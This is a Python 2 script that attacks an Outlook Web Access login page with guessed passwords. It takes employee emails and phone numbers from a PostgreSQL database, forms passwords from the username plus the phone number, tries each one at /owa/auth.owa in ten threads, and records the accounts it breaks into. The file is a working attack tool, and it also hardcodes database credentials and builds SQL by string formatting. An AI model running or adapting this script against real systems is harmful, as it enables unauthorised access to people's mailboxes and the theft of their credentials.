#encoding: utf-8
import urllib
from HTMLParser import HTMLParser
import cookielib
import urllib2
import re
import psycopg2
import threading
import sys
import Queue

target_ip = 'https://mail.haha.com'
conn = psycopg2.connect(database = 'haha', user = 'postgres', password = 'postgres', port = '5432', host = '192.168.70.36')
cur = conn.cursor()
threads = 10

class BruterParse(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tag_name = None
            tag_value = None
            for name, value, in attrs:
                if name == 'name':
                    tag_name = value
                if name == 'value':
                    tag_value = value
                if tag_name is not None:
                    self.tag_results[tag_name] = tag_value
def build_userqueue():
    user_queue = Queue.Queue()
    cur.execute("select email, split_part(email, '@', 1) as user_name, split_part(email, '@', 1) || phone as password from employee where password is null")
    users = cur.fetchall()
    for user in users:
        if user[0]:
            password = ''
            if user[2]:
                password = user[2].lower()
            user_queue.put({'email': user[0], 'user_name': user[1], 'password': password})
    return user_queue
    
def confirm_password(user_queue):
    while not user_queue.empty():
        ori_message = user_queue.get()
        ori_email = ori_message['email']
        email = ori_email.rstrip().lstrip()
        if email is not None:
            username = ori_message['user_name']
            password = ori_message['password']
            jar =  cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
                    
            response = opener.open(target_ip)
            parser = BruterParse()
            parser.feed(response.read())
            post_tag = parser.tag_results
            post_tag['username'] = username
            post_tag['password'] = password
                    
            login_data = urllib.urlencode(post_tag)
            login_response = opener.open(target_ip + '/owa/auth.owa', login_data)
            login_result = login_response.read()
        
            if login_response.code == 200 and login_result.find('id="signInErrorDiv"') == -1:
                print "login successful: username:%s  password: %s" % (post_tag['username'], post_tag['password'])
                conn2 = psycopg2.connect(database = 'haha', user = 'postgres', password = 'postgres', port = '5432', host = '192.168.70.36')
                cur2 = conn2.cursor()                
                cur2.execute("update employee set password = '%s' where email = '%s'" % (password, ori_email))
                conn2.commit()
                cur2.close()
                conn2.close()
            else:
                print "login failed!!!: : username:%s  password: %s"  % (post_tag['username'], post_tag['password'])
           
user_queue = build_userqueue()
for i in range(threads):
    t = threading.Thread(target = confirm_password, args = (user_queue,))
    t.start()
